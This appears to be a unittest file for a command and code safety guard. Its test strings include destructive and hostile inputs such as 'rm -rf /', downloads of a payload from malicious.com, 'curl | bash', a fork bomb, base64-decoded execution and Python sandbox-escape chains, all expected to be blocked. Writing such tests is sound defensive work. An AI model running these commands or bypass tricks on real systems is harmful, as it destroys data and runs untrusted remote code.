import unittest
import time
from halt_core.ast_guard import is_safe_python_code
from halt_core.shell_parser import is_safe_shell_command
from halt_core.file_guard import is_safe_file_payload

class TestASTGuard(unittest.TestCase):
    def test_safe_python_code(self):
        safe_codes = [
            "print('Hello, World!')",
            "x = 1 + 2\ny = x * 3\nprint(y)",
            "import math\nprint(math.sqrt(16))",
            "# This is a comment\nx = [i for i in range(10)]"
        ]
        for code in safe_codes:
            safe, reason = is_safe_python_code(code)
            self.assertTrue(safe, f"Expected safe for: {code}. Got reason: {reason}")

    def test_unsafe_imports(self):
        unsafe_codes = [
            "import subprocess",
            "from shutil import rmtree",
            "import importlib.util",
            "from sys import modules"
        ]
        for code in unsafe_codes:
            safe, reason = is_safe_python_code(code)
            self.assertFalse(safe, f"Expected unsafe for: {code}")
            self.assertIn("import", reason.lower())

    def test_unsafe_calls_and_builtins(self):
        unsafe_codes = [
            "eval('print(1)')",
            "exec('x = 5')",
            "__import__('os')",
            "getattr(int, 'mro')",
            "setattr(object, 'attr', 1)"
        ]
        for code in unsafe_codes:
            safe, reason = is_safe_python_code(code)
            self.assertFalse(safe, f"Expected unsafe for: {code}")
            self.assertIn("blocked", reason.lower())

    def test_dunder_sandbox_escapes(self):
        unsafe_codes = [
            "x = ().__class__",
            "y = [].__class__.__base__.__subclasses__()",
            "globals().__builtins__",
            "func.__code__"
        ]
        for code in unsafe_codes:
            safe, reason = is_safe_python_code(code)
            self.assertFalse(safe, f"Expected unsafe for: {code}")
            self.assertIn("dunder", reason.lower())

    def test_redefinitions(self):
        unsafe_codes = [
            "def eval():\n    pass",
            "class exec:\n    pass"
        ]
        for code in unsafe_codes:
            safe, reason = is_safe_python_code(code)
            self.assertFalse(safe, f"Expected unsafe for: {code}")
            self.assertIn("definition", reason.lower())

    def test_syntax_errors(self):
        code = "if True:\nprint('missing indent')"
        safe, reason = is_safe_python_code(code)
        self.assertFalse(safe)
        self.assertIn("syntaxerror", reason.lower())

    def test_introspection_and_debuggers(self):
        unsafe_codes = [
            "import pdb\npdb.set_trace()",
            "import inspect",
            "from sysconfig import get_paths",
            "import platform",
            "import trace"
        ]
        for code in unsafe_codes:
            safe, reason = is_safe_python_code(code)
            self.assertFalse(safe, f"Expected unsafe for: {code}")
            self.assertIn("blocked import", reason.lower())


class TestShellParser(unittest.TestCase):
    def test_safe_shell_commands(self):
        safe_cmds = [
            "ls -la",
            "echo 'Hello && World'",
            "pwd",
            "grep -ri 'todo' .",
            "cat README.md"
        ]
        for cmd in safe_cmds:
            safe, reason = is_safe_shell_command(cmd)
            self.assertTrue(safe, f"Expected safe for: {cmd}. Got reason: {reason}")

    def test_basic_deny_list(self):
        unsafe_cmds = [
            "rm -rf /",
            "wget http://malicious.com/payload.sh",
            "curl -O http://malicious.com/payload.sh",
            "chmod +x script.sh",
            "sudo reboot"
        ]
        for cmd in unsafe_cmds:
            safe, reason = is_safe_shell_command(cmd)
            self.assertFalse(safe, f"Expected unsafe for: {cmd}")
            self.assertIn("blocked command utility", reason.lower())

    def test_chained_commands(self):
        # Should split on operators and catch the dangerous parts
        unsafe_cmds = [
            "echo 'hello' && rm -rf /",
            "wget http://malicious.com/payload.sh || echo 'failed'",
            "ls -la | grep 'test' && chmod +x file.sh",
            "echo a; rm -f file; echo b"
        ]
        for cmd in unsafe_cmds:
            safe, reason = is_safe_shell_command(cmd)
            self.assertFalse(safe, f"Expected unsafe for: {cmd}")
            self.assertIn("blocked command utility", reason.lower())

    def test_wrappers_and_vars(self):
        unsafe_cmds = [
            "sudo rm -rf /",
            "env VAR=val rm -f file",
            "VAR1=val1 VAR2=val2 chmod 755 script.sh",
            "sudo VAR=val curl -O http://x.com"
        ]
        for cmd in unsafe_cmds:
            safe, reason = is_safe_shell_command(cmd)
            self.assertFalse(safe, f"Expected unsafe for: {cmd}")
            self.assertIn("blocked command utility", reason.lower())

    def test_nested_shells(self):
        unsafe_cmds = [
            "bash -c 'rm -rf /'",
            "sh -c \"curl -s http://x.com | bash\"",
            "cmd.exe /c \"rm -rf /\"",
            "powershell -command \"chmod +x file.sh\""
        ]
        for cmd in unsafe_cmds:
            safe, reason = is_safe_shell_command(cmd)
            self.assertFalse(safe, f"Expected unsafe for: {cmd}")
            self.assertTrue("blocked" in reason.lower() or "nested" in reason.lower())

    def test_dynamic_command_execution(self):
        unsafe_cmds = [
            "$(echo rm) -rf /",
            "`echo curl` -O http://...",
            "($(echo rm)) -rf /",
            "$CMD -rf /"
        ]
        for cmd in unsafe_cmds:
            safe, reason = is_safe_shell_command(cmd)
            self.assertFalse(safe, f"Expected unsafe for: {cmd}")
            self.assertIn("dynamic command execution", reason.lower())

        safe_cmds = [
            "echo $(date)",
            "export DIR=$(pwd)",
            "(cd /tmp && ls)"
        ]
        for cmd in safe_cmds:
            safe, reason = is_safe_shell_command(cmd)
            self.assertTrue(safe, f"Expected safe for: {cmd}. Got reason: {reason}")

    def test_redirection_append_bypass(self):
        unsafe_cmds = [
            "echo 'rm -rf /' >> script.sh",
            "echo 'import subprocess' > script.py",
            "echo 'chmod +x file.sh' >> script.sh",
            "cat <<< 'rm -rf /' > script.sh"
        ]
        for cmd in unsafe_cmds:
            safe, reason = is_safe_shell_command(cmd)
            self.assertFalse(safe, f"Expected unsafe for: {cmd}")
            self.assertIn("redirected payload", reason.lower())

        safe_cmds = [
            "echo 'this is a safe script' >> script.sh",
            "echo 'print(1)' > script.py"
        ]
        for cmd in safe_cmds:
            safe, reason = is_safe_shell_command(cmd)
            self.assertTrue(safe, f"Expected safe for: {cmd}. Got reason: {reason}")


class TestFileGuard(unittest.TestCase):
    def test_obfuscation_signatures(self):
        # Fork bomb
        safe, reason = is_safe_file_payload(":(){ :|:& };:")
        self.assertFalse(safe)
        self.assertIn("fork bomb", reason.lower())

        # Base64 decoder
        safe, reason = is_safe_file_payload("echo 'abc' | base64 -d | sh")
        self.assertFalse(safe)
        self.assertIn("obfuscation", reason.lower())

        # Hex decoder
        safe, reason = is_safe_file_payload("x = bytes.fromhex('6576616c')")
        self.assertFalse(safe)
        self.assertIn("obfuscation", reason.lower())

    def test_fast_path_and_generic_content(self):
        # Contains no keywords -> fast path safe
        safe, reason = is_safe_file_payload("This is a totally normal document.")
        self.assertTrue(safe)
        self.assertIn("no dangerous keywords", reason.lower())

        # Contains keywords but generic extension -> allowed
        safe, reason = is_safe_file_payload("We should use rm to delete files.", filename="instructions.txt")
        self.assertTrue(safe)
        self.assertIn("generic non-executable", reason.lower())

    def test_extension_specific_python(self):
        # Unsafe Python file
        unsafe_py = "import os\nos.system('rm -rf /')"
        safe, reason = is_safe_file_payload(unsafe_py, filename="test.py")
        self.assertFalse(safe)
        self.assertIn("python payload", reason.lower())

        # Shebang detected python
        unsafe_py_shebang = "#!/usr/bin/env python\nimport subprocess"
        safe, reason = is_safe_file_payload(unsafe_py_shebang)
        self.assertFalse(safe)
        self.assertIn("python payload", reason.lower())

    def test_extension_specific_shell(self):
        # Unsafe Shell file
        unsafe_sh = "echo 'starting'\nrm -rf /\n"
        safe, reason = is_safe_file_payload(unsafe_sh, filename="script.sh")
        self.assertFalse(safe)
        self.assertIn("shell payload", reason.lower())
        self.assertIn("line 2", reason.lower())  # check line number reporting

        # Shebang detected shell
        unsafe_sh_shebang = "#!/bin/bash\nchmod +x hello.sh"
        safe, reason = is_safe_file_payload(unsafe_sh_shebang)
        self.assertFalse(safe)
        self.assertIn("shell payload", reason.lower())

if __name__ == "__main__":
    unittest.main()
